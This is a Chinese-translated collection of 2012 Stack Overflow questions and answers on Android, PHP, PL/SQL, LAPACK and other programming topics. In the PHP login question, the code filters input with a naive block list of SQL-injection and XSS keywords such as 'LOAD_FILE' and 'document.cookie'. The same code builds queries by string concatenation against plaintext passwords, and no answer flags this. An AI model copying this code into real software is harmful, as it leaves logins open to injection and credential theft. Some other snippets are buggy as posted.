通信器中的所有进程都将运行该功能（尝试排除通信器中的一个进程，您将获得死锁）。您可以想象不同计算机上的进程盲目地运行相同的代码。但是，由于它们中的每一个都可能属于不同的通信器组并且具有不同的等级，因此该功能将不同地运行。每个进程都知道它是否是通信器的成员，每个进程都知道自己的等级，并且可以与根进程的等级（如果有的话）进行比较，因此它们可以建立通信或相应地执行额外的操作。

# shopify - 在管理仪表板中添加外部链接

> ID：13217150
> 
> 赞同：3
> 
> 时间：2012-11-04T08:26:01.327
> 
> 标签：shopify

![Shopify 管理面板中的链接](../Images/7dc84586d561a7924366e6123011d4c3.png)

我正在开发一个应用程序，需要Shopify 管理面板中的外部**链接，如给定图片。**

在哪里为链接添加代码片段？我是否需要通过 API 添加脚本或更改主题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T11:07:52.187

此功能称为“应用程序链接”。您可以在合作伙伴仪表板上设置这些链接。

1.  转到[https://app.shopify.com/services/partners/](https://app.shopify.com/services/partners/)
2.  单击“应用程序”选项卡
3.  单击您想要的应用程序名称以获得应用程序链接
4.  点击“编辑应用详情”
5.  向下滚动，有“应用程序链接”部分

# android - 如何从弹出窗口中获取输入

> ID：13217152
> 
> 赞同：6
> 
> 时间：2012-11-04T08:26:30.363
> 
> 标签：android, popupwindow, layout-inflater

```
//create inflater
final LayoutInflater inflater = (LayoutInflater) this
                .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
//create popupwindow
    PopupWindow pw=new PopupWindow(inflater.inflate(R.layout.menu, (ViewGroup)findViewById(R.layout.dictionarylist)));

        Button Menu = (Button) findViewById(R.id.Menu);
        Menu.setOnClickListener(new Button.OnClickListener() {
            public void onClick(View v) {
                pw.showAtLocation(v, Gravity.CENTER, 0, 0);
                pw.update(0, 0, 200, 250);
                pw.setOutsideTouchable(false);
            }
        }); 
```

我想要的是当我单击父活动中的按钮时显示弹出窗口。弹出窗口有按钮，当点击按钮时，它会执行一些功能。

![在此处输入图像描述](../Images/b49b427cf592bcd8a4e486b6d51c3a91.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T08:32:32.183

您必须找到按钮的视图，然后将侦听器分配给它，如下所示：

```
View pview=inflater.inflate(R.layout.menu, (ViewGroup)findViewById(R.layout.dictionarylist));

Button Menu = (Button) pview.findViewById(R.id.Menu);

Menu.setOnClickListener(new Button.OnClickListener() {
            public void onClick(View v) {
                pw.showAtLocation(v, Gravity.CENTER, 0, 0);
                pw.update(0, 0, 200, 250);
                pw.setOutsideTouchable(false);
            } 
```

如果您还没有这样的话，还要初始化您的充气机：

```
Inflator inflator = LayoutInflater.from(this); 
```

# c# - 裁剪图片，从 X，Y 获取矩形？

> ID：13217156
> 
> 赞同：0
> 
> 时间：2012-11-04T08:27:06.163
> 
> 标签：c#, coordinates, points

我正在尝试从整数 x，y 坐标裁剪 C# 中的图片。我只是不知道如何得到它？

```
public void doCroppedImage(int pointX, int pointY)
{
    Rectangle cropRect = //???
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-04T10:01:19.267

您可以使用此代码。它返回裁剪后的图像。

```
public static Bitmap CropImage(Image source, int x,int y,int width,int height)
{
    Rectangle crop = new Rectangle(x, y, width, height);

    var bmp = new Bitmap(crop.Width, crop.Height);
    using (var gr = Graphics.FromImage(bmp))
    {
        gr.DrawImage(source, new Rectangle(0, 0, bmp.Width, bmp.Height), crop, GraphicsUnit.Pixel);
    }
    return bmp;
} 
```

但是有一条评论，要裁剪图像，您不仅要知道裁剪点的 x 和 y 坐标，还要知道裁剪图像的宽度和高度。

# php - PHP 和 jQuery AJAX $_SESSION 错误

> ID：13217158
> 
> 赞同：0
> 
> 时间：2012-11-04T08:27:20.380
> 
> 标签：php, ajax, jquery

我花了很多天来解决这个问题，但我找不到解决方案。在我使用我的 ajax 表单 + php 后端登录后，用户被重定向的页面显示“缺少会话”消息，如果我尝试转储 $_SESSION 它看起来像空的。然后，如果我返回并进行相同的登录，它将正常工作。这发生在不同的浏览器（通常是当他们清除 cookie 和缓存时）和不同的托管服务提供商。

这是我的ajax代码：

```
 $(document).ready(function(){
 $('#loginbtn').click(function(){

if($('#username').val() == "" || $('#password').val() == ""){
            return false;   
        }
        else
        {

            $.ajax
            ({
                type: 'POST',
                url: 'ajax_login.php',
                cache: false,
                dataType: 'json',
                data:
                {
                    username: $('#username').val(),
                    password: $('#password').val()
                },
                success:function(data)
                {

                if(data.error === true){

alert("Failed to login: "+data.message)

                    }
                    else
                    {

        setTimeout(function() 
        { 
window.location = 'http://www.mywebsite.com/dashboard.php';
        },2000);  

                    }
                },
                error:function(XMLHttpRequest,textStatus,errorThrown){
            alert("An error occured!");

                }
            });
            return false;
        }

   });    

   }); 
```

这是 PHP 登录后端：

```
<?php
include "config.php"; // start session and connect to mysql db, also contain functions sanitize(), getip()

$username = sanitize(htmlspecialchars($_POST['username'],ENT_QUOTES));
$pass = sanitize($_POST['password']);

 // FUNCTION TO LOGIN
$sql = mysql_query("SELECT * FROM members WHERE username = '$username' AND password = '$pass'"); 
$array = mysql_fetch_array($sql);

if(mysql_num_rows($sql) === 0){
$message['error'] = true;
$message['message'] = "Wrong username or password.";    
echo json_encode($message); 
exit;
}

$_SESSION['username'] = ucwords(strtolower($username)); 
$_SESSION['points'] = $array['points'];
$_SESSION['ip'] = getip(); 
$_SESSION['welcome'] = true;

$message['error'] = false;
$message['message'] = "Completato.";    

echo json_encode($message); 
exit; 
```

最后这是 dashboard.php 检查会话代码：

```
<?php

include "config.php";
if (substr_count($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip')) ob_start("ob_gzhandler"); else ob_start(); 

if($_SESSION['username'] == "") {
header("Location: index.php?nosession");
exit;
} 
```

编辑：这是 config.php 里面的内容

```
<?
session_start();
date_default_timezone_set("Europe/Rome");
$hostname = ""; //hostname 
$data_username = "dbxxxxxxxx"; //database username
$data_password = "xxxxx"; //database password
$data_basename = "dbxxxxxxx"; //database name
$conn = mysql_connect("".$hostname."","".$data_username."","".$data_password."");  
mysql_select_db("".$data_basename."") or die(mysql_error()); 

function sanitize($text) { // funzione che pulisce le stringe per prevenire exploit;
if(get_magic_quotes_gpc() == 0) {
$text = addslashes($text);
}
$text = htmlentities($text);
$text = strip_tags($text);
$escape = mysql_real_escape_string($text);
$arraydangerous = array('SELECT *', 'LOAD_FILE', 'DELETE', 'TRUNCATE', '\' OR', '<javascript>', 'src=', '<?', '?>', 'document.cookie', 'http://', 'www.'); 
$text = str_replace($arraydangerous, "", $text);
return $text;
}

function getip()
{
    return filtra($_SERVER['HTTP_CF_CONNECTING_IP']);   // I use CloudFlare ,so i must use this way :)
} 
```

我怎样才能解决这个问题？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T12:16:16.840

在**config.php**之后添加此行`session_start();`。

```
session_start();

// reset the session, if not logged-in
if (empty($_SESSION['username'])) {

    $_SESSION['username'] = null; 
    $_SESSION['points'] = null;
    $_SESSION['ip'] = null; 
    $_SESSION['welcome'] = null;
} 
```

另外我想你最好把**dashboard.php**改成这样：

```
<?php

include "config.php";

if($_SESSION['username'] == "") {
    header("Location: index.php?nosession");
    exit;
}

if (substr_count($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip')) ob_start("ob_gzhandler"); else ob_start(); 

?> 
```

我认为您的问题是您在测试代码时在服务器上拥有的旧会话。例如，您尝试登录，将值添加到会话，但由于某种原因您收到一些错误，并且您看到您没有登录。您忘记了您已经向会话添加了一些数据，您刷新看到dashboard.php，你会看到，嘿，看来你已经登录了。然后你可能会认为你的代码很疯狂，随机运行或任何其他不相关的原因。（几年前我有一段代码，当天下雨的时候能用，没下雨的时候就不行。幸好我用了2天就解决了这个问题，才发疯！）

您还可以清理存储在服务器上的所有会话，以确保在更改代码时进行干净的测试。

我希望这些会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T08:46:35.557

我不确定是这种情况还是什么（因为我不知道里面有什么`config.php`），但在我看来，您在“PHP 登录后端”文件中使用它之前忘记启动会话了！

# java - 从文件中读取时如何删除空行并对双链表进行排序

> ID：13217161
> 
> 赞同：0
> 
> 时间：2012-11-04T08:27:37.947
> 
> 标签：java, sorting, java.util.scanner

1-从文本文件中读取单词时有空行

例子：

```
 output:
   catholicate 
   chymia

   sitosterol 
   Aries 
```

2-我将单词保存在双链表中，但它没有排序，我如何在双链表中按字母顺序对其进行排序。

该方法，但我没有将保存方法放在双链表中：

```
public static void main(String[] args)throws IOException {

    Scanner input;
    try{
        input = new Scanner(new File(""));
        String c;
        int i=0 ;
        input.useDelimiter(" |:|,|\\.");

        while(input.hasNext()) {
            c=input.next();
            System.out.println(c);
        }
        input.close();
    }
    catch (Exception e){
        System.out.println("error");
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T08:31:43.853

使用`hasNextLine()`如下`nextLine`：

```
 String line = null;
    while(input.hasNextLine()) {
        line=input.nextLine();
        //print the line only when it has some characters
        if(line.length()>0){
          System.out.println(line);
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T08:33:56.177

只需检查`length of line`，如果是`0`则忽略它

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T08:34:00.827

你似乎在为自己把事情复杂化。你应该考虑我至少需要做什么才能完成这项工作。使程序简单并不容易。

> 从文本文件中读取单词时有空行

您必须将这些行添加到链接列表中。如果您跳过空白行，您将“删除”它们。

> 我将单词保存在双链表中，但它没有排序，我如何在双链表中按字母顺序对其进行排序。

如果您使用的是 LinkedList，您可以调用`Collections.sort()`如果您使用的是您自己的链表实现，您需要向我们提供它的代码。

# architecture - DomainEventHandler 应该在哪一层？

> ID：13217165
> 
> 赞同：1
> 
> 时间：2012-11-04T08:28:05.197
> 
> 标签：architecture, domain-driven-design, domain-events

我想使用[Udi Dhahan](http://www.udidahan.com/2009/06/14/domain-events-salvation/)提出的领域事件模式 我的应用程序有以下几层：

UI -> 分布式服务 -> 应用程序服务 -> 域 -> 数据层。

领域层负责引发领域事件。负责处理事件的领域事件处理器应该在哪一层？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:19:52.070

任何你需要的地方。DomainEvents 也用于有界上下文之间的通信，一个聚合根引发一个事件，另一个可能对该事件感兴趣。所以这取决于，这里没有规则。

# sql - 包中的重载过程

> ID：13217166
> 
> 赞同：2
> 
> 时间：2012-11-04T08:28:14.977
> 
> 标签：sql, oracle, plsql, overloading, plsqldeveloper

以下是包 TASK5 的标题

```
CREATE OR REPLACE PACKAGE TASK5 
    AS 
PROCEDURE  TASK5APROCEDURE ( 
REG_NO  IN  NUMBER,
CERT_TITLE   OUT  VARCHAR2,
E_DATE     OUT DATE,
    C_MARKS OUT INTEGER);

PROCEDURE  TASK5BPROCEDURE ( 
CERT_ID  IN  CHAR, 
C_T OUT CHAR) ;    

 END TASK5; 
```

PACKAGE TASK5 的主体

```
CREATE OR REPLACE PACKAGE BODY TASK5 
AS 

 PROCEDURE    TASK5APROCEDURE ( 
    REG_NO  IN  NUMBER,
    CERT_TITLE   OUT  VARCHAR2,
    E_DATE     OUT DATE,
    C_MARKS OUT INTEGER)
            IS
            BEGIN

SELECT 
    O.PCP_TITLE, 
    C.CERT_EXAMDATE, 
    C.CERT_MARKS 

INTO  
    CERT_TITLE, 
    E_DATE, 
    C_MARKS

FROM 
    PROFCERTPROGRAM O
INNER JOIN 
CERTIFICATION C
    ON O.PCP_ID = C.PCP_ID
WHERE 
    C.S_REGNO LIKE REG_NO;
EXCEPTION
               WHEN NO_DATA_FOUND
THEN 
                  DBMS_OUTPUT.PUT_LINE('NO DATA FOUND');

END TASK5APROCEDURE;

PROCEDURE    TASK5BPROCEDURE ( 
CERT_ID  IN  CHAR, C_T OUT CHAR)
            IS
    BEGIN

DBMS_OUTPUT.PUT_LINE ('COURSE NAMES: ');

FOR R IN (  
    SELECT O.C_TITLE C_T
FROM 
    COURSE O
INNER JOIN 
CERTIFICATIONREQUIREMENT C
    ON O.C_ID = C.C_ID
WHERE 
    C.PCP_ID LIKE '%'||CERT_ID||'%')

LOOP
        DBMS_OUTPUT.PUT_LINE (R.C_T);
END LOOP ;

END TASK5BPROCEDURE;

END TASK5; 
```

我为两个不同的输入编写了两个不同的程序包。但是，我想用重载过程重写标题和正文，有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T12:18:28.193

重载意味着在一个包中创建多个同名的过程或函数，它们采用不同数量的参数和/或参数具有不同的数据类型。这使您能够调用过程并根据给定的参数发生不同的事情。

因此，您的问题的答案就是这么简单。在包规范和包正文中重命名`TASK5BPROCEDURE`为。`TASK5APROCEDURE`或者，将它们都重命名为不同的名称。例如，您的规范之后可能如下所示：

```
create or replace package task5  as 

   procedure task5procedure ( 
        , reg_no in number
        , cert_title out varchar2
        , e_date out date
        , c_marks out integer);

   procedure task5procedure ( 
        , cert_id in char 
        , c_t out char);    

end task5; 
```

顺便说一句`dbms_output.put_line`，在捕获的异常中使用并不是真正的最佳实践。如果您要捕获异常，则应该对其进行处理。

正如 APC 在评论中指出的那样，当您执行高度相关的事情时，重载程序是正常的。例如，如果您使用过程发送电子邮件，并且将电子邮件地址作为字符串或数组传递。您在这里的程序中似乎没有做同样的事情，并且可能想重新考虑这样做的必要性。

# php - mysql_pconnect 对生产安全吗？

> ID：13217170
> 
> 赞同：2
> 
> 时间：2012-11-04T08:29:17.650
> 
> 标签：php, mysql

我从来没有只使用过持久性 mysql_pconnect 函数 mysql_connect() 但现在我想将数据库放在自己的服务器上，但想知道它是否可以安全用于生产或我应该注意的任何问题/备份？

为了澄清当神秘的 MySQL 服务器消失或出现其他连接错误时是否有一些故障安全/自动重新连接？还是我必须自己实施？

last_insert_id() 对于正确的连接是否可靠？我读到它是（在修复了一些错误之后）并且没有竞争条件，但是将它用于生产的人可以验证吗？

在生产环境中切换之前我应该​​注意的任何其他连接问题？

我需要实现一些备份 mysql_connect 代码吗？我不想“发现”一些服务器崩溃错误，因此非常感谢有经验的用户提供的任何/所有提示和信息

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-20T02:35:29.817

pconnect 是一个有风险的工具，主要是因为它很容易耗尽数据库连接。使用 mysql_connect 函数将花费稍长的时间，但由于它在脚本末尾断开连接，因此更安全。使用 pconnect 将连接放到一个池中以供重用，这很好，但是一旦您增加工作人员的数量（例如，由于对您的站点的请求数量较多），那么您最好切换到 mysql_connect()以防止在您的数据库服务器上达到 max_connection 限制。

# php - 我无法在 Facebook 上显示我的应用

> ID：13217171
> 
> 赞同：0
> 
> 时间：2012-11-04T08:29:37.430
> 
> 标签：php, facebook

我在整个 Facebook 应用程序开发方面遇到了一点问题。我创建了一个 facebook 应用程序并为我的服务器提供了一个 IP。我在服务器上设置了我的 .php 脚本文件并设置了密钥和 appId。当我在我的 Facebook 帐户上单击应用程序以访问它时，我在浏览器底部收到“正在上传 (0%)”文本，最终我收到一条消息：“此网页不可用”。当我使用“Heroku”托管服务时，我得到了一个应用程序。

我认为问题在于 Facebook 和我的服务器之间的通信，但我不知道是什么。

我几乎尝试了一切。

有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T14:22:32.767

如果您从 linter 工具向您的应用程序发出请求？

[http://developers.facebook.com/tools/debug](http://developers.facebook.com/tools/debug)

如果您通过那里运行自己的应用程序 url 并且看不到任何活动，那么 Facebook 就无法访问您的服务器，您需要对防火墙进行一些工作。

# visual-studio-2008 - 如何正确设置 VS2008 进行 x64 编程？

> ID：13217174
> 
> 赞同：1
> 
> 时间：2012-11-04T08:29:52.607
> 
> 标签：visual-studio-2008, visual-c++, 64-bit

在 x64 win7 上，我安装了 VS2008 和 x64 编译工具。我正在使用一个简单的“hello world”控制台程序对其进行测试。x86 和 x64 版本都编译得完美无缺。x86 版本的 Debug 和 Release 子版本都可以正常工作。发布的 x64 版本也可以正常工作。但是，Debug x64 版本总是引发并排错误。似乎找不到调试运行时。

有人建议安装 Debug runtime redist。这让我感到惊讶：x64 调试运行时是否应该已经与 VS2008 安装一起作为 x86 版本？

非常感谢！

@sj1900 “某些 x64 编译器组件在 VS 安装中是可选的。值得检查它们是否已全部安装。” 这是屏幕截图： ![VS2008 组件](../Images/2a24d5e3ff92340aad38c5dc9ca6cc34.png)

我在这里没有看到任何进一步的选择。winSxS 中根本没有 amd64_microsoft.vc90.debugcrt。奇怪的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T08:32:26.960

一些 x64 编译器组件在 VS 安装中是可选的。值得检查它们是否都已安装。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T20:59:28.497

经过数小时的挠头和测试，我最终认为这是一个 VS2008 安装程序错误，并得到了几个在线参考的证实。

如果第一次安装 vs2008**时没有**x64 编译器工具**，但****后来**通过安装程序的修改功能安装了 x64 工具，则会出现错误：所有 x64 调试运行时和 nodebug openMP 运行时都将丢失。重新安装不会解决此问题。

我尝试了许多互联网上建议的方法：安装所有修补程序、ATL 更新、更新到 SP1 或安装 VCredist ... 没有任何效果。

我发现有两种方法可以解决这个问题：

1.  完全卸载 VS2008，然后使用选择的 x64 工具重新安装 VS2008。

2.  这对于安装大量修补程序的人来说会很烦人。最直接的方法是**构建一个安装程序来安装所有那些缺少的运行时**：`create porject->other projects->setup project`. 然后`add&Merge Module`-> 选择所有缺少的运行时`Microsoft_VC90_OpenMP_x86_x64.msm`：`Microsoft_VC90_DebugOpenMP_x86_x64.msm`和`Microsoft_VC90_DebugCRT_x86_x64.msm`. 构建并发布解决方案，运行安装程序，然后转到`%windir%\winsxs`，您应该会高兴地看到所有这些运行时文件夹。然后你就可以开始调试你的 x64 程序了。如果您使用的是 VS2008SP1，那么您可能会收到另一个关于运行时版本的错误。为避免这种情况，请在开始创建安装程序之前安装 SP1 的 ATL 更新。

PS：在 VS2008 中还有很多其他烦人但不是致命的错误，M$ 从来没有费心去修复。因此远离 VS2008 并尝试 VS2010，除非您的项目有特殊需要迫使您坚持使用 VC9。

# ruby-on-rails - ActionView::Template::Error (nil:NilClass 的未定义方法 `gsub')

> ID：13217176
> 
> 赞同：3
> 
> 时间：2012-11-04T08:30:30.863
> 
> 标签：ruby-on-rails, gsub

github上的代码：[https ://github.com/Youngv/bbs](https://github.com/Youngv/bbs)

提取的源代码（在第 6 行附近）：

```
3: <% @posts.each do |post| %>
4:     <div class="post-line">
5:       <div class="title">
6:       <%= link_to post.title, post %>
7:       </div>
8:       <div class="info">
9:         <% if !post.user.blank? %> 
```

在服务器中显示：`ActionView::Template::Error (undefined method 'gsub' for nil:NilClass)`

我的代码中没有“gsub”，但出现了这个问题，我该如何更改代码？

# c++ - 使用 LAPACK 计算无限带状矩阵的特征值

> ID：13217177
> 
> 赞同：0
> 
> 时间：2012-11-04T08:30:44.917
> 
> 标签：c++, lapack, eigenvalue

我是 C++ 新手，正在尝试弄清楚如何使用 LAPACK 来查找无限带状矩阵的特征值（非谐振荡器问题）。我知道当我检查了值并且它们都匹配时，我正在正确计算矩阵。但是，我不确定我是否正确地将值传递给子例程，或者我是否混淆了某些东西，因为返回的特征值不是我所期望的。我正在使用 dsbtrd 子例程来计算它。这是手册：http: [//www.netlib.org/lapack/explore-html/d0/d62/dsbtrd_8f.html](http://www.netlib.org/lapack/explore-html/d0/d62/dsbtrd_8f.html)

关于我可能出错的地方有什么想法吗？

```
#include <iostream>
#include <algorithm>
#include <string>
#include <math.h>
using namespace std;

//SUBROUTINE DSBTRD( VECT, UPLO, N, KD, AB, LDAB, D, E, Q, LDQ, WORK, INFO )

extern "C" {
  void dsbtrd_(const char *vect, const char *uplo, int *n, int *kd, double *ab, int *ldab, double d[], double e[], double *q, int *ldq, double work[], int *info);
}

#define MAX 14

int main(){
    // Values needed for dsbtrd
    const char *vect = "V";
    const char *uplo = "U";
    int n;
    int ldab = MAX;
    int ldq = MAX;
    int info;
    double ab[MAX][ldab];
    double d[MAX];
    double e[MAX];
    double q[MAX][ldq];
    double work[MAX];

    //other values needed
    int i,j,delta;
    double eps;
    double a[MAX][MAX];
    double g[MAX][MAX];

    //Read in value of eps and n
    cout <<"Enter epsilon: \n";
    cin >> eps;
    cout << "Epsilon = " << eps << "\n";

    cout <<"Enter n: \n";
    cin >> n;
    cout << "n = " << n << "\n";

    if(n >= MAX){
         cerr << "n is great than max \n";
     }

     //Build matrix g
     for(j = 0; j < n; j++){
         for(i = 0; i < n; i++){
             int m = min(i,j);

             if(i == j){
                 g[i][j] = 1.5*(pow(m,2) + m +.5);
             }else if( i == j + 2 || i == j - 2){
                 g[i][j] = (m + 1.5)*sqrt((m+1)*(m+2));
             }else if(i == j + 4 || i == j -4){
                 g[i][j] = .25*sqrt((m+1)*(m+2)*(m+3)*(m+4));
             }else{
                 g[i][j] = 0;
             }
         }
    }

    //Build the starting matrix a
    //row i, column j

    for(j = 0; j < n; j++){
        for(i = 0; i < n; i++){
            if(i == j){
                delta = 1;
            }else{
                delta = 0;
            }

            a[i][j] = (i + .5)*delta + eps*g[i][j];
        }
    }

    //Build the matrix ab
    // ab(kd+1+i-j,j) = a(i,j) for max(1,j-kd)<=i<=j
    int kd = n - 1;

    for(j = 1; j <= n; j++){
        for(i = max(1,j-kd); i <= j; i++){
            ab[j-1][kd+i-j] = a[j-1][i-1];
        }
    }

    //Solve for eigenvalues
    dsbtrd_(vect, uplo, &n, &kd, &ab[0][0], &ldab, d, e, &q[0][0], &ldq, work, &info);

    //Check for success
    if(info == 0)
    {
        //Write answer
        for(i = 0; i < n; i++){
            cout << "Eigenvalue " << i << ": " << d[i] << "\n";
        }
    }
    else
    {
        //Write error
        cerr << "dsbtrd returned error " << info << "\n";
    }
    return info;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T13:27:39.943

DSBTRD 不计算特征值。它将矩阵简化为三对角形式；您正在拉出生成的三对角矩阵的主对角线并假装这些是特征值，但它们不是。

您需要在生成的三对角形式上调用 DSTERF（或其他几个例程之一）以获取特征值。

有关详细信息，请参阅[LAPACK 用户指南](http://www.netlib.org/lapack/lug/node48.html)。

# android - 更改 ListView 项目背景颜色但保留默认选择器样式？

> ID：13217178
> 
> 赞同：7
> 
> 时间：2012-11-04T08:31:02.763
> 
> 标签：android, android-layout

我正在尝试以编程方式在我的 ListView Adapter 中设置自定义背景颜色，但我想保留 Android 的默认 Listview Selector 样式。

我正在使用我的项目视图的“SetBacgroundResource”方法设置背景颜色。

我正在使用 Android 4.0，并尝试了此博客[http://daniel-codes.blogspot.co.nz/2010/07/how-to-change-listview-rows-background.html](http://daniel-codes.blogspot.co.nz/2010/07/how-to-change-listview-rows-background.html)中的示例，但使用此示例选择器显示，但是未显示未选择的背景颜色。

如何在 Android 4.0 ICS 中实现这一点？

编辑：这是我用于列表项背景可绘制的资源。

```
<selector xmlns:android="http://schemas.android.com/apk/res/android">
   <item android:state_window_focused="false" android:state_selected="true" android:drawable="@android:color/transparent" /> 
   <item android:state_selected="true" android:drawable="@android:color/transparent" /> 
   <item android:state_pressed="true" android:state_selected="false" android:drawable="@android:color/transparent" /> 
   <item android:state_selected="false" android:drawable="@color/list_item_first" /> 
</selector> 
```

我用来设置此背景可绘制对象的代码位于我的 adatapter 的 GetView 方法中。代码是：

```
convertView.setBackgroundResrouce(R.drawable.list_item_dark); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-10T20:45:50.087

您是否尝试将您的属性[android:drawSelectorOnTop](http://developer.android.com/reference/android/widget/AbsListView.html#attr_android%3adrawSelectorOnTop)设置`ListView`为 true ？
您将能够为您的项目设置背景，并在按下时看到突出显示的项目。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T17:32:39.387

尝试编写您的自定义适配器并像这样设置 rowView BackgroundColor（如果位置奇数黑色，偶数红色）。您也可以将颜色列表发送到适配器并为每个 rowView 设置不同的颜色

```
public View getView(int position, View convertView, ViewGroup parent) {
            View rowView = convertView;
        enter code here

            if(rowView == null)
            {
                if((position % 2)==1){ 
                rowView.setBackgroundColor(Color.BLACK)
                    //colorList :setBackgroundColor( colorList.get(position) )
                }
                 else{
                    rowView.setBackgroundColor(Color.RED)
                }
             }           
            return rowView;
        } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-08T01:40:13.990

试试这个：

在您的行布局中设置背景属性

```
android:background="@drawable/your_selector" 
```

和你的`listView`套装

```
android:listSelector="@drawable/your_selector" 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-13T20:42:11.833

尝试将此样式应用于您的 ListView：

```
<style name="List">
    <item name="android:layout_width">fill_parent</item>
    <item name="android:layout_height">fill_parent</item>
    <item name="android:background">#FFFFFF</item>
    <item name="android:dividerHeight">1dp</item>
    <item name="android:divider">#CCCCCC</item>
    <item name="android:cacheColorHint">#FFFFFF</item>
    <item name="android:listSelector">#00000000</item>
</style> 
```

在你的 xml 布局中：

```
<ListView 
    android:id="@+id/listView"
    style="@style/List"
    android:paddingTop="1dp"/> 
```

# javascript - 未捕获的类型错误：未定义不是函数

> ID：13217185
> 
> 赞同：1
> 
> 时间：2012-11-04T08:32:28.610
> 
> 标签：javascript, jquery, asp.net-mvc-4

我正在按照[这个站点](http://www.geekbeing.com/2012/05/18/implement-live-web-chat-part-1)的示例来尝试实现一个实时网络聊天应用程序。我对 javascript 到 jquery 非常陌生，所以我想我只是复制示例并边学习边添加内容。

这是我正在使用的代码：

```
@{
    ViewBag.Title = "OnlineUsers";
}

<html>
<head>
    <title>Online Users</title>
    <link rel="stylesheet" href="http://cdn.leafletjs.com/leaflet-0.4/leaflet.css" />
    <script src="http://cdn.leafletjs.com/leaflet-0.4/leaflet.js"></script>

</head>
<body>
    <div id="wrapper">
        <div id="upperPanel">
            <div>
                <ul id="messages" itemid="@HttpContext.Current.User.Identity.Name">

                </ul>
            </div>
            <div id="friends">

            </div>
        </div>
        <div id="bottomPanel">
            <textarea rows="2" cols="100" id="chatMessage"></textarea>
            <input id="chatSubmitMessage" type="submit" value="Send" style="margin-left: 10px;" /><br />  
        </div>
    </div>​​​​​​​​​​​​​

    <script type="text/javascript">
        $(function () {
            var pusher = new window.Pusher('0b7eeff567653e170094');
            var channel = pusher.subscribe('chat_channel');
            channel.bind('message_received', function (data) {
                $("#messages").
                append('<li>' + data.user + ' ' + data.message + ' ' + data.timestamp + '</li>');
            });

            $('#chatSubmitMessage').bind('click', function () {
                $.post("/", {
                    chatMessage: $('#chatMessage').val(),
                    username: $('#messages').attr('itemid')
                });
            });
        });
    </script>

    </div>    
</body>
</html> 
```

这段代码在 Chrome 调试器中给了我以下错误：

```
Uncaught TypeError: undefined is not a function
(anonymous function)
fire jquery-1.8.2.js:974
self.add jquery-1.8.2.js:1018
jQuery.fn.jQuery.ready jquery-1.8.2.js:246
jQuery.fn.jQuery.init jquery-1.8.2.js:174
jQuery jquery-1.8.2.js:44
(anonymous function)
(anonymous function) jquery-1.8.2.js:564
jQuery.extend.globalEval jquery-1.8.2.js:565
(anonymous function) jquery-1.8.2.js:6006
jQuery.extend.each jquery-1.8.2.js:611
jQuery.fn.extend.domManip jquery-1.8.2.js:5991
jQuery.fn.extend.append jquery-1.8.2.js:5764
jQuery.fn.(anonymous function) jquery-1.8.2.js:6186
$.ajax.success jquery.mobile-1.2.0.js:3685
fire jquery-1.8.2.js:974
self.fireWith jquery-1.8.2.js:1082
done jquery-1.8.2.js:7788
callback 
```

我假设该错误与未命名的函数有关，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T08:34:33.937

您不是在加载 jquery，而是在尝试使用它。把这个加到你的头上

```
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T08:59:53.190

您是否包含了 Pusher 代码？确保打开网络检查器并尝试查看 window.Pusher 是否实际上未定义。如果未定义，请将[Pusher 及其依赖项包含到文件的头部](http://pusher.com/tutorials/realtime_chat_widget)。让我知道这是否是您的问题。很难用问题中给出的内容来判断。

# python - 设计健全性检查

> ID：13217195
> 
> 赞同：2
> 
> 时间：2012-11-04T08:35:55.743
> 
> 标签：python, sanity-check

我有一个基于 GUI 的项目。我想把它放到代码本身和 GUI 部分。

这是我的代码 `Main.py`：：

```
class NewerVersionWarning(Exception):
    def __init__(self, newest, current=__version__):
        self.newest = newest
        self.current = current
    def __str__(self):
        return "Version v%s is the latest version. You have v%s." % (self.newest, self.current)

class NoResultsException(Exception):
    pass

# ... and so on
def sanity_check():
    "Sanity Check for script."
    try:
        newest_version = WebParser.WebServices.get_newestversion()
        if newest_version > float(__version__):
            raise NewerVersionWarning(newest_version)
    except IOError as e:
        log.error("Could not check for the newest version (%s)" % str(e))

    if utils.get_free_space(config.temp_dir) < 200*1024**2: # 200 MB
        drive = os.path.splitdrive(config.temp_dir)[0]
        raise NoSpaceWarning(drive, utils.get_free_space(config.temp_dir))

# ... and so on 
```

现在，在 GUI 部分，我只是在 try-except 块中调用该函数：

```
 try:
        Main.sanity_check()
    except NoSpaceWarning, e:
        s = tr("There are less than 200MB available in drive %s (%.2fMB left). Application may not function properly.") % (e.drive, e.space/1024.0**2)
        log.warning(s)
        QtGui.QMessageBox.warning(self, tr("Warning"), s, QtGui.QMessageBox.Ok)
    except NewerVersionWarning, e:
        log.warning("A new version of iQuality is available (%s)." % e.newest)
